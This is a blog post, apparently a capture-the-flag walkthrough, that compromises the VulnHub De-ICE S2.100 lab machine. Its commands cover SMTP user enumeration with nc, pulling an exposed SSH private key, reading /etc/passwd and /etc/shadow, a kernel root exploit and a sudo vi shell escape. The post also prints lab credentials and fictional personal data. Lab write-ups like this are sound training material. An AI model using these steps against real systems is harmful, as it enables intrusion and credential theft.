@@ -1,0 +1,232 @@
+---
+layout: post
+title: "DE-ICE-S2.100"
+date: 2015-05-10 11:40:38 +0200
+comments: true
+categories: 
+---
+Image: [De-ICE: S2.100](https://www.vulnhub.com/entry/de-ice-s2100,13/)
+
+Nmap output:
+{% codeblock %}
+PORT    STATE  SERVICE  VERSION
+21/tcp  open   ftp      vsftpd 2.0.4
+22/tcp  open   ssh      OpenSSH 4.3 (protocol 1.99)
+25/tcp  open   smtp     Sendmail 8.13.7/8.13.7
+80/tcp  open   http     Apache httpd 2.0.55 ((Unix) PHP/5.1.2)
+110/tcp open   pop3     Openwall popa3d
+143/tcp open   imap     UW imapd 2004.357
+{% endcodeblock %}
+
+We found out that there is another IP address on the same network:
+{% codeblock %}
+Nmap scan report for 192.168.2.101
+Host is up (0.00038s latency).
+Not shown: 999 filtered ports
+PORT   STATE SERVICE
+80/tcp open  http
+MAC Address: 00:0C:29:53:2F:A3 (VMware)
+{% endcodeblock %}
+
+Enumerating SMTP users, we get:
+{% codeblock %}
+root@kali:~# for i in $(cat /usr/share/ncrack/default.usr); do echo $i; echo -e "\nehlo lol\nmail from:$i@slax.example.net\nrcpt to:$i\nquit\n" | nc 192.168.2.100 25; done  | grep -i 'Recipient ok' 
+250 2.1.5 root... Recipient ok
+250 2.1.5 operator... Recipient ok
+250 2.1.5 manager... Recipient ok
+250 2.1.5 Manager... Recipient ok
+250 2.1.5 adm... Recipient ok
+250 2.1.5 lp... Recipient ok
+250 2.1.5 MAIL... Recipient ok
+250 2.1.5 system... Recipient ok
+250 2.1.5 MANAGER... Recipient ok
+250 2.1.5 OPERATOR... Recipient ok
+250 2.1.5 halt... Recipient ok
+250 2.1.5 Root... Recipient ok
+250 2.1.5 SYSTEM... Recipient ok
+250 2.1.5 ftp... Recipient ok
+250 2.1.5 mail... Recipient ok
+250 2.1.5 toor... Recipient ok
+250 2.1.5 ROOT... Recipient ok
+250 2.1.5 shutdown... Recipient ok
+250 2.1.5 bin... Recipient ok
+250 2.1.5 POSTMASTER... Recipient ok
+250 2.1.5 nobody... Recipient ok
+250 2.1.5 games... Recipient ok
+250 2.1.5 postmaster... Recipient ok
+250 2.1.5 NEWS... Recipient ok
+250 2.1.5 sync... Recipient ok
+250 2.1.5 INGRES... Recipient ok
+250 2.1.5 daemon... Recipient ok
+250 2.1.5 uucp... Recipient ok
+250 2.1.5 Operator... Recipient ok
+250 2.1.5 webmaster... Recipient ok
+250 2.1.5 news... Recipient ok
+{% endcodeblock %}
+
+We used CEWL to create wordlist (userlist.txt) to reveal another user accounts.
+Before we use this command, it's good to check if the disk is not full for
+proper SMTP functionality.
+{% codeblock %}
+root@kali:# for i in $(cat ~/vulnhub/DE-ICE-S2.100/userlist.txt); do echo $i; echo -e "\nehlo lol\nmail from:$i@slax.example.net\nrcpt to:$i\nquit\n" | nc 192.168.2.100 25; done  | grep -i 'Recipient ok'
+250 2.1.5 havisham... Recipient ok
+250 2.1.5 magwitch... Recipient ok
+250 2.1.5 pirrip... Recipient ok
+{% endcodeblock %}
+
+Again, this could be automatized using smtp-user-enum script:
+{% codeblock %}
+root@kali:# smtp-user-enum -M RCPT -f root@slax.example.net -U userlist.txt -t 192.168.2.100
+{% endcodeblock %}
+
+Dirb found the following URLs:
+{% codeblock %}
+http://192.168.2.101/~havisham/
+http://192.168.2.101/~magwich/
+http://192.168.2.101/~pirrip/
+http://192.168.2.101/~pirrip/.ssh/
+{% endcodeblock %}
+
+We download the private key of pirrip user and log in:
+{% codeblock %}
+-----BEGIN RSA PRIVATE KEY-----
+MIIEoQIBAAKCAQEA1pfb/CVukUw4Xe67YLEZzVHWNax0zJjI1CfcsoEGylmmtlA6
+iXHi41nLshzXu9n536JfM9LFAWGqefBVX7Bzd/fC4+jHS3q89IK9FP7gFPwEmlNH
+CwPX0ADxDFyB1lJOFffJ9gVw3VgHCaCPgS70UqJD0hZFDMSDMoBa91PylFQR0m58
+nMq8DsGRbeC5hTdpLXKfBuW8v/lFuNEWVWNcZDie82aiJg8WRUUIrzeGZSR3+cG1
+hi6za67VIi+ce8fFuBvIgaEpvJ0JSIX7zPLUV10ezW1NQRNplKSam3TIYI3+Ywuh
+lcgpEyliHYReN6v91+um2c6LNy9y/vx2Akci5QIBIwKCAQEAvhF5s3GcchBPLqA/
+kCfVBk/MW2zcerM1iLWXlsoNVCOFB+Co4CMKyV4pcd8IOKsfJSlqQ9fwUa5GiUKU
+wne2urbf0S1CzdMcY4m9al4W7gPJkACeAnEeO+OTq9zoBvhxDCSc79ju7+7hqXD0
+IfZjXyIBjjD7VHOKJWpfMtVTMunBCMqoAMa2veuN6LgDJweQNi7kon4qcj4SghGI
+bdBv/Cnk7PMkG+DhafTRWyXGMWFpTHV4BNKv0i+k4lVV1oP9nJnh9jglY4EkD9LD
+0Yt2QZt+XMTlxScsjcBpVGc9m4ZrgmRZGV0PTyMuWJtURkDBYPizkiPjjSZfUbyZ
+y9QECwKBgQDsR9wLzrQbJIaOX8dG4rEt8pQHdYK7KCM8Bcq45iKKPzeLxchguM3o
++y9nRz5x8RWXWZUMl7PldoqwmrKh6WVCrdJ7mghPTYx3Djhcaf8q5XFTUhZH4xhB
+72g1H6+JCECUjAFfjoSTOEswCFKYssgYA22x3fvLGg3S8f0UjjE1xQKBgQDogKVg
+iyXCE833evccfrd/otsyVcxNincunAtYDAsqa2ZrjXL3oFwNwfC1CVKPhqDlnG46
+M1tiSeYXygPbuPbHzRdu0ZuG7jRxxVdndl52gq/Zt8MKNRD9mdbFRcRMXmMRfaE4
+RXdry9eB4rPywfWgJPGNVtOFZP6PRVv+IpoqoQKBgBRArHYKZzWGybRunA1j400U
+ytwRYvoZYhsWcHY/nI+Bwu65Lm6wwTE6GgGJw4Yb+olQ0kLoboFh7qFsWHRHNJCv
+0DZ66sT4BLm/Y+qp/+275SRmHyq7sZ9AaASNr/XNgeDYzOru9Wu0XjdRK6awPQlf
+YSyAvc+UhNeRFbFOBDfPAoGAVlurI9vpc/i6N1mO+/SNTKo0KKOGZfGZ+16H3t/m
+496/pEp7KMaIl2VKxuY0m7WpedsEXsKeSRQiQ1mpqWH1QuXG4AS2HCyXIvGG3Uk5
+B3JekrH3/HocQO//UJZBmLVX/y6pmI7UlcC9wodnaMuzAPfHbwL+G5qKb7qtI+D3
+busCgYATj4y+8msxNWRRNbHWAV7G0OurPDeZJ8F8NDLpM22X8fM08wgGRwkW4fpa
+A+J8tN2ibiDqw29W6Rc1/4evAPbo3GR932W/ELOTOpP2yquiwoSxPG+HCLHmDITr
+1qGHJRSOiFzo99iS5aQRhUvdl3M0lz1Cort7hjRKUkSWcT02Rw==
+-----END RSA PRIVATE KEY-----
+{% endcodeblock %}
+
+{% codeblock %}
+root@kali:~# chmod 600 pirrip-rsa.ssh
+root@kali:~# ssh -l pirrip 192.168.2.100 -i pirrip-rsa.ssh
+Linux 2.6.16.
+pirrip@slax:~$
+
+pirrip@slax:/etc$ cat /etc/passwd
+root:x:0:0::/root:/bin/bash
+bin:x:1:1:bin:/bin:
+daemon:x:2:2:daemon:/sbin:
+adm:x:3:4:adm:/var/log:
+lp:x:4:7:lp:/var/spool/lpd:
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/:
+news:x:9:13:news:/usr/lib/news:
+uucp:x:10:14:uucp:/var/spool/uucppublic:
+operator:x:11:0:operator:/root:/bin/bash
+games:x:12:100:games:/usr/games:
+ftp:x:14:50::/home/ftp:
+smmsp:x:25:25:smmsp:/var/spool/clientmqueue:
+mysql:x:27:27:MySQL:/var/lib/mysql:/bin/bash
+rpc:x:32:32:RPC portmap user:/:/bin/false
+sshd:x:33:33:sshd:/:
+gdm:x:42:42:GDM:/var/state/gdm:/bin/bash
+pop:x:90:90:POP:/:
+nobody:x:99:99:nobody:/:
+pirrip:x:1000:10:Philip Pirrip:/home/pirrip:/bin/bash
+magwitch:x:1001:100:Abel Magwitch:/home/magwitch:/bin/bash
+havisham:x:1002:100:Estella Havisham:/home/havisham:/bin/bash
+{% endcodeblock %}
+
+The root accound can be obtained using exploit from Kali:
+{% codeblock %}
+root@kali:/usr/share/exploitdb# scp platforms//linux/local/9575.c root@192.168.80.140:/tmp/
+
+  * hoagie_udp_sendmsg.c
+  * LOCAL LINUX KERNEL ROOT EXPLOIT (< 2.6.19) - CVE-2009-2698
+{% endcodeblock %}
+
+{% codeblock %}
+sh-3.1# cat /etc/shadow
+root:$1$/Ta1Q0lT$CSY9sjWR33Re2h5ohV4MX/:13882:0:::::
+bin:*:9797:0:::::
+daemon:*:9797:0:::::
+adm:*:9797:0:::::
+lp:*:9797:0:::::
+sync:*:9797:0:::::
+shutdown:*:9797:0:::::
+halt:*:9797:0:::::
+mail:*:9797:0:::::
+news:*:9797:0:::::
+uucp:*:9797:0:::::
+operator:*:9797:0:::::
+games:*:9797:0:::::
+ftp:*:9797:0:::::
+smmsp:*:9797:0:::::
+mysql:*:9797:0:::::
+rpc:*:9797:0:::::
+sshd:*:9797:0:::::
+gdm:*:9797:0:::::
+pop:*:9797:0:::::
+nobody:*:9797:0:::::
+pirrip:$1$KEj04HbT$ZTn.iEtQHcLQc6MjrG/Ig/:13882:0:99999:7:::
+magwitch:$1$qG7/dIbT$HtTD946DE3ITkbrCINQvJ0:13882:0:99999:7:::
+havisham:$1$qbY1hmdT$sVZn89wKvmLn0wP2JnZay1:13882:0:99999:7:::
+
+sh-3.1# cat /var/access/.htpasswd
+aadams:bS.PQ9hVYEqrQ
+{% endcodeblock %}
+
+There is another way to get root account, first we find out the password for pirrip user:
+{% codeblock %}
+pirrip@slax:/var/spool/mail$ cat pirrip
+
+E-Mail: pirrip@slax.example.net
+Password: 0l1v3rTw1st
+{% endcodeblock %}
+
+{% codeblock %}
+pirrip@slax:/var/spool/mail$ sudo -l
+pirrip@slax:/var/spool/mail$ sudo vi
+:!/bin/bash
+{% endcodeblock %}
+
+Finally, in /root/.save we obtain the following data:
+
+{% codeblock %}
+From sikes@slax.example.net  Sun Jan 13 23:53:37 2008
+Return-Path: <sikes@slax.example.net>
+Received: from slax.example.net (localhost [127.0.0.1])
+        by slax.example.net (8.13.7/8.13.7) with ESMTP id m0DNlmHb009636
+        for <pirrip@slax.example.net>; Sun, 13 Jan 2008 23:47:48 GMT
+Received: (from sikes@slax.example.net)
+        by slax.example.net (8.13.7/8.13.7/Submit) id m0DNlmDI009635
+        for pirrip; Sun, 13 Jan 2008 23:47:48 GMT
+From: Bill Sikes <sikes@slax.example.net>
+Message-Id: <200801132347.m0DNlmDI009635@slax.example.net>
+Date: Sun, 13 Jan 2008 23:47:48 +0000
+To: pirrip@slax.example.net
+Subject: Raises
+User-Agent: nail 11.25 7/29/05
+MIME-Version: 1.0
+Content-Type: text/plain; charset=us-ascii
+Content-Transfer-Encoding: 7bit
+
+Here's the data for raises for your team:
+Philip Pirrip:  734-67-0424 5.5% $74,224
+Abel Magwitch:  816-03-0028 4.0% $53,122
+Estella Havisham: 762-93-1073 12% $84,325
+{% endcodeblock %}
